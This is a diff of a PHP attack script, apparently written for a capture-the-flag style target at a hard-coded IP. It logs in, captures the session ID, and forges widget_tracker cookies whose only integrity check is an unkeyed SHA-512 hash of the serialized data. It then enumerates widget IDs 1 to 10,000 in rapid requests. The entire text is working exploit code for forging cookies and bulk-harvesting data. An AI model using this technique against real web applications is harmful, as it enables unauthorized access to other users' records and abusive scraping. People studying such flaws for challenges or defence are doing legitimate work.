@@ -1,19 +1,43 @@
 <?php
-     
-function getValues($x) {
+define("COOKIE_PATH", "cookies.txt");
+define("USERNAME", "1@1.1");
+define("PASSWORD", "t");
+
+function setLoginCookie($username, $password) {
+	$post_variables = "username=" . urlencode($username) . "&password=" . urlencode($password);
+
+	$ch = curl_init('http://128.238.66.224/login.php');
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($ch, CURLOPT_POST, 1);
+	curl_setopt($ch, CURLOPT_POSTFIELDS, $post_variables);
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($ch, CURLOPT_HEADER, 1);
+	$results = curl_exec($ch);
+	curl_close($ch);
+
+	$results = explode("\r\n", $results);
+	foreach ($results as $value) {
+		if (preg_match("/PHPSE/", $value)) {
+			$cookie = substr($value, 22, -8);
+			break;
+		}
+	}
+
+	return $cookie;
+}
+
+function getWidgetList($start, $cookie) {
 	$ids = array();
      
-	echo "x: $x";
+	echo "start id: $start";
      
-	for ($i=$x; $i<$x+100; $i++) {
+	for ($i=$start; $i<$start+100; $i++) {
 		$ids[] = $i;
 	}
      
-	$widget_tracker = serialize($ids);
-	$widget_validate = hash("sha512", $widget_tracker);
-	$widget_tracker = urlencode(base64_encode($widget_tracker));
-     
-	$cookie = "PHPSESSID=pmijceglok20ahdacmufc8cui7; widget_tracker={$widget_tracker}; widget_validate={$widget_validate}";
+	$widget_tracker = urlencode(base64_encode(serialize($ids)));
+	$widget_validate = hash("sha512", serialize($ids));
+	$cookie = "PHPSESSID={$cookie}; widget_tracker={$widget_tracker}; widget_validate={$widget_validate}";
      
 	$ch = curl_init('http://128.238.66.224/widget_list.php');
 	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
@@ -25,9 +49,10 @@ function getValues($x) {
      
 	return $result;
 }
-     
+
+$cookie = setLoginCookie(USERNAME, PASSWORD);
+
 for ($i=1; $i<10000; $i+=100) {
-	echo getValues($i);
-	sleep(1);      
+	echo getWidgetList($i, $cookie);
 }
 
